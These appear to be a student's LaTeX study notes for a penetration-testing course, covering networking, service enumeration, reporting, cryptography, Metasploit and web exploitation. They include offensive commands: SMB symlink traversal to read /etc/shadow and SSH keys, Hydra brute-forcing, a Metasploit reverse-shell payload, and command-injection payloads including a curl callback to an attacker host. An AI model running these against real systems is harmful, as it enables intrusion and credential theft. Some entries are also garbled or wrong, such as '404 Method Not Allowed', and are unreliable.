\part*{4 - Networking Fundamentals}

\section*{Local Area Network}

A \textbf{LAN (local area network)} is a network restricted to a small geographical area.

\section*{Wide Area Network}

\textbf{WAN (Wide Area Network)} is a larger network that connects multiple LANs across potentially great distances.

\section*{Internet}

The \textbf{internet} itself is an example of a WAN. It is a global network of networks that uses a standardized protocol to allow billions of devices to interoperate.

\section*{Network Topology}

\begin{itemize}
    \item \textbf{Physical Topology}: The cables that are plugged in.
    \item \textbf{Logical Topology}: The way the data flows.
\end{itemize}

\subsection*{Common Topology Types}

\begin{itemize}
    \item \textbf{Point-to-Point (P2P)}: Direct link between two nodes.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Simple and high-bandwidth.
            \item \textcolor{red}{Cons:} Not very scalable.
        \end{itemize}
    \item \textbf{Bus}: All devices share a single backbone cable.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Cost-effective for simple networks.
            \item \textcolor{red}{Cons:} Prone to collisions and backbone failure.
        \end{itemize}
    \item \textbf{Ring}: Each devices connects two neighbors.
        \begin{itemize}
            \item Token passing.
            \item \textcolor{red}{Cons:} One node failing can cause the entire network to fail.
        \end{itemize}
    \item \textbf{Star}: All devices connect to a \textbf{switch}.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Easy to manage and fault-isolated.
            \item \textcolor{red}{Cons:} Switch failure causes entire network to fail.
        \end{itemize}
    \item \textbf{Mesh}: Every device connects to many or all other devices.
        \begin{itemize}
            \item \textbf{Full}: Node connects to all other nodes.
            \item \textbf{Partial}: Node connects to some of the nodes.
            \item \textcolor{green}{Pros:} Highly reliable and secure.
            \item \textcolor{red}{Cons:} Complex and expensive.
        \end{itemize}
    \item \textbf{Tree}: Hierarchical structure combining a star and a bus.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Scalable.
            \item \textcolor{red}{Cons:} Central hub failure impacts the entire network.
        \end{itemize}
    \item \textbf{Hybrid}: Combination of topologies.
        \begin{itemize}
            \item \textcolor{green}{Pros:} Offres flexibility.
            \item \textcolor{red}{Cons:} High design and maintenance costs.
        \end{itemize}
\end{itemize}

\section*{OSI Model}

The \textbf{OSI model} is a conceptual framework used to understand how data moves from a physical wire up to a user application.

\begin{itemize}
    \item \textbf{Physical (L1)}: Hardware (cables, radio waves, fiber optics).
    \item \textbf{Data Link (L2)}: Local delivery (switches, MAC addresses).
    \item \textbf{Network (L3)}: Routing across networks (IP addresses, routers).
    \item \textbf{Transport (L4)}: End-to-end communication (TCP, UDP, ports).
    \item \textbf{Session (L5)}: Managing connections between applications (Linux socket API, Winsock, AppleTalk, WebRTC, Airdrop).
    \item \textbf{Presentation (L6)}: Data formatting and encryption (SSL/TLS, JPG, ASCII).
    \item \textbf{Application (L7)}: What the user interacts with (HTTP, SSH, DNS).

\end{itemize}

\section*{Networking Devices/Protocols}

\subsection*{MAC Address}

\textbf{MAC Addresses} are \texttt{48-bit} "burned-in" physical identifiers for network hardware.

\subsection*{CAM Table}

\textbf{CAM Tables} are maintained by switches and maps a device's MAC address to a specific physical port on the switch.

\subsection*{Switches}

A \textbf{switch} is the \textit{"brain"} of a LAN.
\begin{itemize}
    \item Ensures data packets sent from one computer does not clutter the network.
\end{itemize}

\subsubsection*{Switches - Handling Data}

\begin{enumerate}
    \item When a packet arrives, the switch looks up the Destination MAC in the CAM table.
    \item \textbf{MAC Address Found:} Data is sent to the corresponding port.
    \item \textbf{MAC Address Unknown:} Data is flooded to every port until the correct device responds.
\end{enumerate}

\subsection*{Address Resolution Protocol (ARP)}

Computers communicate via \textbf{IP addresses}, hardware communicates via \textbf{MAC addresses}.
\medskip

\textbf{ARP Process}:
\begin{itemize}
    \item \textbf{Request}: A host sends a broadcast: "Who has IP 192.168.1.1? Tell 192.168.1.50."
    \item \textbf{Reply}: Device with that IP sends a unicast back: "I have that IP. My MAC Address is AA:BB:CC..."
\end{itemize}

\textbf{ARP Caching}: Computers store mappings in an \textit{ARP Cache} for a few minutes.

\subsection*{Router}

To make routing efficient, IP addresses are \textbf{hierarchical} (ZIP Code > Street > House Number).

\begin{itemize}
    \item \textbf{Network Portion}: Identifies the specific network or "neighborhood" where the device is located.
    \item \textbf{Host Portion}: Identifies the specific device or "house" within that neighborhood.
\end{itemize}

\subsection*{Subnetting}

\textbf{Subnet Mask}: Mathematical "filter" that tells a device exactly where the Network portion ends and the Host portion begins. Determines the boundaries of the local network.
\medskip


\begin{itemize}
    \item \textbf{Local Traffic}: If the destination IP shares the same Network portion as the sender, data travels directly through the switch>
    \item \textbf{Remote Traffic}: If Network portions are different, data must be sent to the Router.
\end{itemize}

\subsection*{CIDR Notation}

Computers see IP addresses and masks as 32-bit binary strings.
\begin{itemize}
    \item \textbf{/24 Mask}: 24 bits reserved for the Network, leaving 8 bits for Hosts \textbf{(256 addresses)}.
    \item \textbf{/16 Mask}: 16 bits reserved for the Network, leaving 16 bits for Hosts \textbf{(65536 addresses)}.
\end{itemize}

\part*{5 - Common Services}

\subsection*{CVE}

A \textbf{CVE (Common Vulnerability and Exposure)} is the result of a rigorous research and reporting process.

\begin{itemize}
    \item \textbf{Discovery}: Flaw is found in a piece of software.
    \item \textbf{Reporting}: Researher notifies software vendor first, giving the vendor time to create a patch.
    \item \textbf{Assignment}: A \textbf{CNA (CVE Numbering Authority)} assigns an unique ID to the flaw.
    \item \textbf{Publication}: CVE is published to \textbf{National Vulnerability Database (NVD)}, given a CVSS Score based on how easy it is to exploit and how much damage it can do.
\end{itemize}

There is a three-step workflow to prove that a version in place is a risk.

\begin{enumerate}
    \item \textbf{Fingerprinting}: Using tools (like \texttt{nmap -sV}) to find the exact version of a service.
    \item \textbf{Searching for CVEs}: Research on that version to find vulnerabilities.
    \item \textbf{Finding a Proof of Concept}: Look for code that successfully demonstrates the exploit.
\end{enumerate}

\subsection*{Domain Name Service (DNS)}

\textbf{DNS} is the resolution engine of the world, mapping domain names to IP addresses and routing email via \textit{MX records} and provides service location via \textit{SRV records}.
\medskip

DNS is hierarchical and chained; no single server knows every address, and instead they have to communicate with other servers.
\medskip

DNS is very useful for pentesters because it can reveal subdomains and the internal infrastructure of many networks.

\subsection*{DNS Interaction}

Purely query based. Tools like \texttt{dig} and \texttt{nslookup} can be used by pentesters to manually query DNS servers.

\begin{itemize}
    \item \textbf{Lookup IP (A Record)}: \texttt{dig <domain\_name> A}
    \item \textbf{Lookup Mail Servers (MX Record)}: \texttt{dig <domain\_name> MX}
    \item \textbf{Lookup Name Servers (NS Record)}: \texttt{dig <domain\_name> NS}
    \item \textbf{Reverse Lookup}: \texttt{dig -x <target\_IP>}
    \item \textbf{Tracing}: \texttt{dig <domain\_name> +trace} (\textit{shows every step of the DNS resolution process})
\end{itemize}

\subsection*{Zone Transfers}

A \textbf{DNS Zone Transfer (AXFR)} is a mechanism intended for replicating DNS records between a primary and a secondary server.
\medskip

The vulnerability exists when a DNS server is misconfigured to allow AXFR requests from any IP address, and thus attackers can obtain a \textit{full copy} of the DNS zone file, revealing every recorded subdomain, internal IP address, and mail server.

\begin{itemize}
    \item \textbf{Attempt Transfer}: \texttt{dig axfr \@<dns\_server\_ip> <domain\_name>}
\end{itemize}

\subsection*{Domain Hijacking}

Attackers can register abandoned domain names or claim abandoned IP addresses of outdated NS records. This allows the attacker to become an "authoritative" source for that domain, allowing them to \textbf{intercept emails}, \textbf{create fake subdomains}, or \textbf{redirect users to phishing sites.}

\begin{itemize}
    \item \texttt{dig ns <domain\_name>} to check if those name servers are active or registrable
    \item Look for \texttt{SERVFAIL} or \texttt{NXDOMAIN} responses when querying nameservers
    \item Register the expired name domain at a public registrar
    \item \texttt{dig <domain\_name>} to verify the hijack
\end{itemize}

\subsection*{File Transfer Protocol (FTP)}

\textbf{File Transfer Protocol (FTP)} is a protocol primarily used for bulk file transfers, website maintenance, and distributing large software packages.

\begin{itemize}
    \item \textbf{Stateful and clear-text}: the commands, usernames, and passwords sent over FTP is visible to anyone sniffing traffic. \textbf{FTPS} implements certificates and fixes this issue.
    \item \textbf{TCP 21}: sends commands and receiving status codes.
    \item \textbf{TCP 20}: used for actual transfer of file data in "Active" mode.
\end{itemize}

\subsubsection*{FTP: Interaction}

\begin{enumerate}
    \item \texttt{ftp <target\_IP>}: Begin with a connection on TCP port 21, followed by authentication.
    \item \texttt{ls -R}: recursively list subdirectories and files similar to the Linux shell.
    \item \texttt{get <filename>}: download files from server to local machine.
    \item \texttt{put <filename>}: upload files from local to server machine.
    \item \texttt{bye} or \texttt{exit}: exit the session.
\end{enumerate}

\subsubsection*{FTP: Anonymous Login}

\textit{Anonymous login} is a legacy feature; turned on only for the admin's convenience but can become a vulnerability when the FTP root directory is set to a sensitive path or when permissions are globally readable.

\begin{enumerate}
    \item \texttt{nmap -sV --script ftp-anon <target>}: check for this vulnerability.
    \item \texttt{wget -m ftp://anonymous:anonymous@<target>}: mirrors entire server locally.
\end{enumerate}

\subsection*{Server Message Block (SMB)}

Originally developed by IBM in the early 1980s as a simple file sharing tool, later heavily adopted and refined by Microsoft and evolved into the primary communication method for Windows-based environments.

\begin{itemize}
    \item \textbf{TCP 445}: modern standard for SMB over IP.
    \item \textbf{UDP 137/138 \& TCP 139}: legacy ports used for NetBIOS communication.
    \item Organized into \textbf{"shares"} - specific folders made available to the server.
    \item Used for \textbf{resource sharing}, including sharing files, printers, and serial ports between computers on a network.
    \item Provides IPC to "request" a service from another computer on the network.
    \item Backbone of \textbf{Windows Active Directory}.
\end{itemize}

\subsubsection*{SMB: Interaction}

\begin{enumerate}
    \item \texttt{smbclient -L //<target\_IP>/ -U <username>}: shows all available shares.
    \item \texttt{smbclient //<target\_IP>/<share\_name> -U <username>}: connect to a share.
    \item \texttt{put <filename>}: uploading a file.
    \item \texttt{sudo mount -t cifs //<target\_IP>/<share\_name> -U /mnt/smb -o}: mount as a drive.
\end{enumerate}

\subsubsection*{SMB: Null Sessions}

\textbf{SMB null sessions} is an unauthenticated connection to a Windows SMB server that allows an attacker to query the system for information without any credentials (enabled when \texttt{RestrictAnonymous = 0} in the registry). It allows for enumeration of the network to provide enough information for password spraying, targeted phishing attacks, and sometimes even direct file access.

\begin{enumerate}
    \item \texttt{rpcclient -U "" -N <target>}: successful prompt indicates vulnerability.
    \item \texttt{enumdomusers} or \texttt{querydispinfo}: inside \texttt{rpcclient} to enumerate account names.
    \item \texttt{smbclient -L //<target> -N}: reveals hidden or administrative shares available for access.
    \item \texttt{enum4linux -a <target>}: scrapes all available system and user data in one command.
\end{enumerate}

\subsubsection*{SMB: Symlink Traversal}

\textbf{Symlink traversal} occurs when the Samba service is configured to follow "wide links" that point outside of the designated share path. Attackers with write access to a share can create symbolic links to root, effectively bypassing the share.

\begin{enumerate}
    \item \texttt{symlink / root\_portal}: point the share entry to the server's root directory.
    \item \texttt{cd root\_portal}: yeah
    \item \texttt{get /etc/shadow} or \texttt{/root/.ssh/id\_rsa}: yeah
\end{enumerate}

\subsection*{Secure Shell (SSH)}

The \textbf{Secure Shell (SSH)} protocol was designed specifically to replace insecure, clear-text protocols such as Telnet, rlogin, and FTP.

\begin{itemize}
    \item Used for secure remote command-line access, remote command execution, and encrypted file transfers via \textbf{SFTP} or \textbf{SCP}.
    \item \textbf{TCP 22}: universal port for SSH.
    \item \textbf{Public key cryptography}: Establishes an encrypted tunnel between the client and server before any authentication happens.
\end{itemize}

\subsubsection*{SSH: Interaction}

SSH is almost always preferred over Telnet or FTP because it protects passwords from being sniffed over the wire.

\begin{enumerate}
    \item \texttt{ssh <username>@<target\_IP>}: connect to remote terminal.
    \item \texttt{ssh <username>@<target\_IP> '<command>'}: connects, runs a command, and exits.
    \item \texttt{scp <local\_file> <username>@<target\_IP>:/home/user/}: copy file to server.
    \item \texttt{scp <username>@<target\_IP>:/etc/passwd ./local\_copy.txt}: copy file from server.
    \item \texttt{sftp <username>@<target\_IP>}: FTP-like interface running over SSH.
\end{enumerate}

\part*{6 - Writing Reports}

\section*{Types of Reports}

\subsection*{Vulnerability Assessment}

\begin{itemize}
    \item \textbf{Deliverable}: High-volume list of every potential flaw found by an automated scanner.
    \item Designed for broad coverage.
\end{itemize}

\subsection*{Penetration Test}

\begin{itemize}
    \item \textbf{Deliverable}: Manual testing and full proof of concept.
    \item Fcouses on the \textbf{attack chain}, or proving how an attacker can move laterally through a network.
\end{itemize}

\subsection*{Compliance-Driven Reports}

\begin{itemize}
    \item Reporst are written specifically to satisfy regulatory bodies.
    \item Often, reports must map technical findings directly to legal violations.
\end{itemize}

\subsection*{Specialized Tests}
\begin{itemize}
    \item Can have different frameworks or deliverables from common penetration tests.
\end{itemize}

\section*{Drafts}

Different clients have different priorities and preferences, and some organizations will request a draft report that allows clients.

\begin{itemize}
    \item Gives clients the opportunity to provide feedback, clarify details, or explain how they plan to address specific findings.
    \item Some organizations will request an immediate report upon discovery of a critical vulnerability.
\end{itemize}

\section*{Nontechnical Components}

\subsection*{Legal \& Overview}

Good reports must begin with a clear Executive Summary and Engagement Overview that establishes legal and administrative boundaries of the test.

\begin{itemize}
    \item \textbf{Sensitivity Warning}: Explicitly states who owns the data and the penalties for unauthorized release.
    \item \textbf{Contact Information}: Clear line of communication between testing team and client's emergency response contacts.
    \item \textbf{Executive Summary}: High-level summary for executives.
    \item \textbf{Engagement Overview}: Outlines the objectives and goals of the penetration test, along with a rigid scope list of what was allowed to be tested to ensure testers didn't stray into unauthorized systems.
\end{itemize}

\subsection*{Executive Summary}

The most-read part of the document, written for non-technical stakeholders who allocate budgets.

\begin{itemize}
    \item \textbf{Refrain} from using \textbf{technical language} in this section.
    \item Give an overview of what was tested.
    \item Give an extremely broad overview of the most impactful findings.
    \item Include any other information you find absolutely necessary for non-technical executives to know.
\end{itemize}

\subsection*{Engagement Overview}

\begin{itemize}
    \item Provide a list of in-scope assets.
    \item Good practice to create and provide a \textbf{visual network diagram}.
\end{itemize}

\section*{Technical Report and Findings}

\subsection*{Calculating CVSS Scores}

\textbf{CVSS} (Common Vulnerability Scoring System) provides a numerical score (0.0 - 10.0) based on ease of exploitation and severity.
\medskip

Sometimes, a raw CVSS score isn't enough. An \textit{adjusted CVSS score} accounts for the difference in the vulnerability of browser on a locked-down kiosk versus that on the CEO's laptop.

\subsection*{Anatomy of a Technical Finding}

Each finding in the Technical Report section must follow a consistent modular structure:

\begin{itemize}
    \item \textbf{Adjusted CVSS Score}: Numerical rating (0.0 - 10.0) that accounts for the specific likelihood and impact on the client's business.
    \item \textbf{Details}: High-level explanation of the vulnerability.
    \item \textbf{Confirmation}: Step-by-step evidence, including specific commands used and terminal output, along with screenshots where necessary for understanding/proof.
    \item \textbf{Impact}: Worst-case scenarios for the client.
    \item \textbf{Mitigation}: Clear, actionable advice on how to fix/mitigate the issue.
\end{itemize}

\section*{Additional Reporting Advice}

\subsection*{QA Lifestyle}

Reports should never go from pentester directly to the client. It should pass through a \textbf{Quality Assurance (QA)} phase.

\begin{itemize}
    \item \textbf{Technical Accuracy}: Are the reproduction steps correct?
    \item \textbf{Consistency}: Does the \textbf{Executive Summary} match the \textbf{Technical Findings}?
    \item \textbf{Tone}: Is the language professional?
\end{itemize}

\subsection*{Appendices}

The \textbf{Appendices} are for the "deep dive" information that would clutter up the main report:

\begin{itemize}
    \item \textbf{Tool List}: Transparency about what software was used.
    \item \textbf{Methodology}: Explaining the standard followed.
    \item \textbf{OSINT \& Phishing}: Detailed logs of what was found in public records or the results of social engineering campaigns.
\end{itemize}

\section*{7 - Basic Cryptography}

\subsection*{Encoding vs. Encryption}

\textbf{Encoding} is a public transformation of data.

\begin{itemize}
    \item Prioritizes \textbf{usability} and \textbf{reproducibility}.
    \item Ensures binray data can survive being sent over protocols that only support text.
    \item \textit{Example:} Base64, URL encoding, ASCII.
\end{itemize}

\bigskip

\textbf{Encryption} transforms data using a \textbf{secret} (a key).

\begin{itemize}
    \item Without the secret, the transformed data should be indistinguishable from random noise.
    \item \textit{Example:} AES, RSA, PGP.
\end{itemize}

\subsubsection*{Real World Example: Encoding}

\begin{itemize}
    \item \textbf{URL Encoding}
        \begin{itemize}
            \item \textbf{Input:} \texttt{Hello World!}
            \item \textbf{Encoded:} \texttt{Hello\%20World\%21}
            \item Why? Browsers can't handle spaces or "!" in URLs reliably.
        \end{itemize}
    \item \textbf{Base64 Encoding}
        \begin{itemize}
            \item \textbf{Input:} \texttt{admin:password123}
            \item \textbf{Encoded:} \texttt{YWRtaW46cGFzc3dvcmQxMjM=}
            \item Why? Used to send credentials in HTTP Basic Auth headers without breaking the protocol.
        \end{itemize}
\end{itemize}

\subsection*{Base64}

\begin{itemize}
    \item Most common encoding variation.
    \item Processes data in \textbf{24-bit} groups, reresenting them as four \textbf{6-bit} units.
    \item Padding in the form of \texttt{=} signs is added to the end.
\end{itemize}

\subsection*{Symmetric Encryption}

\textbf{Symmetric encryption} uses a single shared secret key for both encrytpion and decryption.

\begin{itemize}
    \item Anyone with the keyc an read the data.
    \item Fast, used to encrypt large amounts of information.
    \item \textcolor{red}{Cons:} Key distribution - safely sharing the secret key without interception and keeping it from being leaked afterwards.
\end{itemize}

\bigskip

Instead of trying to break \textbf{symmetric encryption}, people instead look for:

\begin{itemize}
    \item Hardcoded encryption keys in source code.
    \item Keys stored in configuration files.
    \item Weak encryption modes.
    \item Reused keys across systems.
\end{itemize}

\subsubsection*{Common Symmetric Ciphers}

\begin{itemize}
    \item \textbf{AES (Advanced Encryption Standard)}: Used in TLS, disk encryption, VPNs.
    \item \textbf{ChaCha20}: Modern, fast cipher used in TLS and mobile systems.
\end{itemize}

\subsection*{Asymmetric Encryption}

\textbf{Asymmetric cryptography} (public key cryptography) uses two related keys instead of a single shared key:

\begin{itemize}
    \item \textbf \textbf{Public Key}: Shared with everyone, used to encrypt data.
    \item \textbf \textbf{Private Key}: Kept secret - decrypts data encrypted with the \textbf{public key}.
\end{itemize}

\bigskip

SSH keys are a good example of \textbf{asymmetric cryptography}. The private key never leaves the client machine, so if the server was compromised the attackers will only have access to your public key.

\subsubsection*{Common Asymmetric Ciphers}

\begin{itemize}
    \item \textbf{RSA}: Widely used for certificates, signatures, and legacy encryption.
    \item \textbf{Elliptic Curve Cryptography (ECC)}: Modern alternative used on occasion in TLS, SSH, and certificates. (super cool shit)
\end{itemize}

\subsection*{Password Attacks}

Two types of password attacks:

\begin{itemize}
    \item \textbf{Online Attacks}: Pentester attemptse authentication directly against a running service. May trigger alerts, rate limits, or account lockouts.
    \item \textbf{Offline Attacks}: Happen after obtaining password hashes or encrypted credential stores that can then be cracked locally without interacting with the target.
\end{itemize}

\bigskip

In addition, there are different ways for cracking passwords:

\begin{itemize}
    \item \textbf{Brute Force Attacks}: attempt every possible character combination.
        \begin{itemize}
            \item Computationally expensive.
            \item Usually impractical.
        \end{itemize}
    \item \textbf{Dictionary Attacks}: Use curated wordlists containing real passwords, leaked credentials, and common patterns.
        \begin{itemize}
            \item Highly effective due to human nature.
            \item Much faster than a \textbf{brute force attack}.
        \end{itemize}
    \item \textbf{Hybrid Attacks}: Modify dictionary wordlist entries by adding numbers, symbols, and capitalization changes, or patterns such as seasons or company names to each word.
\end{itemize}

\subsubsection*{Password Spraying}

\textbf{Password Spraying}: Takes brute force password attacks but targets a group of accounts with the same password.

\begin{itemize}
    \item Reduces the chance of lockouts.
    \item Extremely effective in real corporate environments due to organizations enforcing complexity but not uniqueness of passwords.
\end{itemize}

\subsection*{Hydra}

Fast, online password-guessing tool used by pentesters to test login services. Performs both \textbf{brute force} and \textbf{dictionary} attacks.

\begin{enumerate}
    \item Identify the service, such as using scanning tools to confirm attack vectors.
    \item Prepare inputs, including username lists and password wordlists.
    \item Run Hydra attack:
        \begin{itemize}
            \item \texttt{hydra -l exampleuser -P passwords.txt ssh://target\_IP}: single user with password list
            \item \texttt{hydra -L users.txt -P passwords.txt ssh://target\_IP}: multiple users and passwords
        \end{itemize}
\end{enumerate}

\part*{8 - Introduction to Metasploit}

\textbf{Metasploit} is an open-source poject used for exploiting security vulnerabilities on host machines.

\bigskip

\textbf{IMPORTANT}: It is crucial to keep Metasploit up to date.

\subsection*{MSFConsole}

\begin{itemize}
    \item \texttt{sudo msfdb init}: initiate the Metasploit database.
    \item \texttt{msfconsole}: start the metasploit console
    \item \texttt{show exploits}: list all commands
    \item \texttt{search 2007-2447}: search for an exploit
    \item \texttt{grep usermap search cve-2007}: command line grep
\end{itemize}

\subsection*{Metasploit Exploitation Plan}

\begin{itemize}
    \item Find a vulnerability.
    \item \texttt{use multi/samba/usermap\_script}: use an exploit that exploits vulnerability
    \item \texttt{show options}, \texttt{set RHOST 172.16.28.161}: set options for the exploit
    \item \texttt{show payloads}: determine payload to use
    \item \texttt{set PAYLOAD cmd/unix/reverse\_perl}: set the payload
    \item \texttt{show advanced}: show even more options
    \item \texttt{exploit}: run the exploit!
\end{itemize}

\subsection*{Metasploit Module Rank}

\begin{itemize}
    \item \textbf{Excellent} (will never crash the service)
    \item \textbf{Great} (has default target, auto-detect application specific return address)
    \item \textbf{Good} (default target is the common case)
    \item \textbf{Normal} (reliable but depends upon a specific version)
    \item \textbf{Average} (unreliable or difficult to exploit)
    \item \textbf{Low} (nearly impossible to exploit)
    \item \textbf{Manual} (unstable or difficult to exploit or of no use unless configured by user)
\end{itemize}

\subsection*{MS08\_067\_API}

\begin{itemize}
    \item \textbf{Rank: Great}
    \item Exploits a vulnerability assigned \textbf{CVE-2008-4250)}, a buffer overflow in the Windows SMB service.
    \item Same vulnerability is exploited by the Conficker worm and Stuxnet.
    \item Superseded by \textbf{MS17-010}, codenamed \textbf{Eternal Blue}.
\end{itemize}

\subsection*{Meterpreter}

The \textbf{Meterpreter} is a payload that has the following properties:

\begin{itemize}
    \item Provides a command interpreter that runs as the user who was executing the exploited process.
    \item Supports listing of remote system's files, file upload and download, remote shell execution and many other functions.
    \item \texttt{getsystem}: for Windows to escalate privilege to \texttt{NT AUTHORITY\\SYSTEM}
    \item \texttt{grep meterpreter show payloads}: list of different available meterpreter payloads
    \item \texttt{sessions}: command used to manage sessions. Only one session may be active and interacted with at a time, but multiple sessions may co-exist.
    \item \texttt{sessions <session\_number>}: enter a session designated by its number.
\end{itemize}

\subsubsection*{Meterpreter: Under the Hood}

\begin{itemize}
    \item Uses a \textbf{stager} to download code and inject into a DLL.
    \item Meterpreter payload is small; payload determines how the meterpreter on the victim is to interact with your metasploit framework.
    \item \textbf{TLS/1.0 (Transport Layer Security)}: used to encrypt all communications between attacker and victim.
        \begin{itemize}
            \item Used for obfuscation, not security, since this protocol is insecure (susceptible to \textit{padding oracle attack}).
            \item Avoid meterpreter hijacks by using \textit{paranoid mode} (using a self-generated certificate and certificate-pinning the payload).
        \end{itemize}
\end{itemize}

\part*{9 - Web Exploitation}

\section*{Web Application}

A \textbf{web application} is software that runs a remote server and is typically accessed through a browser over a network.

\section*{Client-Server Model}

Every web interaction follows the same pattern: a \textbf{client} makes a request, a \textbf{server} sends a response.

\bigskip

HTTP is stateless; each request is completely independent.

\subsection*{Request-Response Cycle}

\begin{enumerate}
    \item Browser checks \texttt{/etc/hosts}, then resolves DNS: \texttt{example.com -> 93.184.216.34}.
    \item Browser opens TCP connection to server on port 443 (HTTPS).
    \item TLS handshake establishes encrypted tunnel.
    \item Browser sends HTTP GET request with headers.
    \item Server processes request, finds the resource.
    \item Server responds: \texttt{HTTP/1.1 200 OK} + headers + body requested.
    \item Browser parses HTML in response body, fires more requests for CSS/JS/images.
\end{enumerate}

\section*{HTTP Fundamentals}

\textbf{HTTP} (Hypertext Transfer Protocol) is the application-layer protocol governing all web communication. Every browser request and server response follows HTTP rules.

\subsection*{HTTP Protocols}

\begin{itemize}
    \item \textbf{HTTP/1.1}
        \begin{itemize}
            \item Most compatible and still widely used.
            \item One request per TCP connection (mostly).
            \item Plain-text headers that are human-readable.
        \end{itemize}
    \item \textbf{HTTP/2}
        \begin{itemize}
            \item Multiplexes many requests over one connection.
            \item \textbf{Binary framing} (not plain text).
            \item Headers compressed via \textbf{HPACK}.
        \end{itemize}
    \item \textbf{HTTP/3}
        \begin{itemize}
            \item Built on \textbf{QUIC} (UDP-based).
            \item Faster connection setup, better on lossy networks.
            \item Increasingly deployed on CDNs.
        \end{itemize}
\end{itemize}

\subsection*{HTTP Methods}

\begin{itemize}
    \item \textbf{GET}: Requests a specific resource. Additional data can be passed to the server via query strings in the URL.
    \item \textbf{POST}: Sends data to the server. This data is appended in the request body after the headers.
    \item \textbf{PUT}: Creates new resources on the server. Prone to enabling the uploading of malicious resources.
    \item \textbf{PATCH}: Applies partial modifications to the resource at the specified location.
    \item \textbf{DELETE}: Deletes an existing resource on the webserver. If not properly secured, can lead to a \textbf{Denial of Service (DoS)} attack by deleting critical files on the server.
    \item \textbf{HEAD}: Requests the headers that would be returned if a \textbf{GET} request was made to a server. Used to check the response length before downloading resources.
    \item \textbf{OPTIONS}: Returns information about the server, such as the methods accepted by it.
\end{itemize}

\subsection*{HTTP Status Codes}

\begin{itemize}
    \item \textbf{1xx - Informational}
        \begin{itemize}
            \item \texttt{100 Continue}
            \item \texttt{101 Switching Protocols}
        \end{itemize}
    \item \textbf{2xx - Success}
        \begin{itemize}
            \item \texttt{200 OK}
            \item \texttt{201 Created}
            \item \texttt{204 No Content}
        \end{itemize}
    \item \textbf{3xx - Redirection}
        \begin{itemize}
            \item \texttt{301 Permanent Redirect}
            \item \texttt{302 Temporary Redirect}
            \item \texttt{304 Not Modified (Cached)}
        \end{itemize}
    \item \textbf{4xx - Client Errors}
        \begin{itemize}
            \item \texttt{400 Bad Request}
            \item \texttt{401 Unauthorized}
            \item \texttt{403 Forbidden}
            \item \texttt{404 Not Found}
            \item \texttt{404 Method Not Allowed}
            \item \texttt{429 Too Many Requests}
        \end{itemize}
    \item \textbf{5xx - Server Errors}
        \begin{itemize}
            \item \texttt{500 Internal Server Error}
            \item \texttt{502 Bad Gateway}
            \item \texttt{503 Service Unavailable}
        \end{itemize}
\end{itemize}

403 vs 404 tells you whether a path exists. A 200 on a restricted endpoint is a clue. A 500 after injecting a quote means input may have hit a SQL query.

\subsection*{HTTP Request Header}

\begin{itemize}
    \item \textbf{Host}: Tells the sever which virtual host to serve.
    \item \textbf{User-Agent}: Identifies the client. Completely attacker-controlled, useful for bypassing bot detection.
    \item \textbf{Cookie}: Sends stored cookies to the server. Authentication tokens are usually stored here; stealing it means stealing the identity.
    \item \textbf{Authorization}: Carries credentials. Always check what scheme is used and whether the token is replayable.
    \item \textbf{Content-Type}: Declares the body format. Changing it can bypass input validation logic.
        \begin{itemize}
            \item \texttt{application/json}
            \item \texttt{multiport/form-data}
            \item \texttt{application/x-www-form-urlencoded}
        \end{itemize}
    \item \textbf{Referer}: Previous page URL. Exploitable when it is the only access ccontrol check.
    \item \textbf{X-Forwarded-For}: Attacker-controlled IP field added by proxies. Apps trusting it for rate limiting or geo-restrictions are trivially bypassed.
\end{itemize}

\subsection*{HTTP Response Headers}

\begin{itemize}
    \item \textbf{Set-Cookie}: Creates browser cookies.
        \begin{itemize}
            \item Missing \texttt{HttpOnly = JS}: can steal sessions.
            \item Missing \texttt{Secure}: sent over HTTP (insecure).
            \item Missing \texttt{SameSite}: \textbf{CSRF} exposure.
        \end{itemize}
    \item \textbf{Content-Type}: How the browser interprets the body. Mismatch between actual content and declared type = MIME sniffing attack surface.
    \item \textbf{Location}: Redirect target for 3xx responses. user-controlled data rflected here = open redirect vulnerability.
    \item \textbf{X-Frame-Options}: DENY or SAMEORIGIN. Prevents iframe embedding. Absence enables Clickjacking attacks.
    \item \textbf{Content-Security-Policy (CSP)}: Whitelist of allowed resource origins. A strict CSP is the primary mitigation against XSS.
    \item \textbf{Strict-Transport-Security (HSTS)}: Forces HTTPS for the domain. Prevents SSL stripping.
    \item \textbf{Server / X-Powered-By}: Version disclosure. Match against CVE databses for known vulnerabilities.
\end{itemize}

A \textbf{web proxy}is software that sits between your browser and target web server, intercepting every HTTP and HTTPS request your browse rand sends every respones the server returns.

\subsection*{OWASP ZAP Web Proxy}

\begin{itemize}
    \item Free and open source.
    \item Intercepting proxy, active/passive scanner, spider, fuzzer, and scripting engine.
    \item Supports addons for extended functionality.
\end{itemize}

\subsection*{Burp Suite}

\begin{itemize}
    \item Industry standard for web application security testing.
\end{itemize}

\subsubsection*{Key Features}

\begin{itemize}
    \item \textbf{Proxy}: Intercepts traffic between your browser and the target.
    \item \textbf{Repeater}: Resend individual requests many times with manual modifications.
    \item \textbf{Intruder}: Automates sending many requests with varying payloads. Works for brute force, fuzzing, and credential stuffing attacks.
    \item \textbf{Decoder}: Encode/decode data in common formats: Base64, URL, HTML, hex, and more.

\section*{Web Exploitation}

\subsection*{HTTP Verb Tampering}

HTTP requests use a \textbf{method} to what it wants the server to do. Developers may forget to write checks for edge-case verbs at certain endpoints. By tampering with the verb we may be able to access endpoints without the intended authorization.

\begin{itemize}
    \item Use \texttt{OPTIONS} method to request exactly what the server supports.
\end{itemize}

\subsection*{Command Injection}

f apps pass input directly to the command line without any checks, you can add extra commands.

\subsubsection*{Command Injection: How It Works}

\paragraph*{Shell Separators}

Standard shell features that work exactly as intended if the input reaches the shell.

\begin{itemize}
    \item \texttt{;} \textbf{semicolon}: runs the next command
    \item \texttt{|} \textbf{pipe}: sends the output of the first command to the second
    \item \texttt{\&\&} \textbf{double ampersand}: runs the second command only if the first succeeded
    \item \texttt{||} \textbf{double pipe}: runs the second command only if the first one failed
\end{itemize}

\paragraph*{Blind Command Injection}

\begin{itemize}
    \item \texttt{; sleep 5 --} \textbf{Time Delay}: If the response takes longer than 5 seconds, likely indicates injection.
    \item \texttt{; echo test > /var/www/html/proof.txt --} \textbf{File Write}: check if the file was written and now hosted
    \item \texttt{; curl https://YOUR-IP/ --} \textbf{Network Callback}: check for the request arriving on your server
\end{itemize}

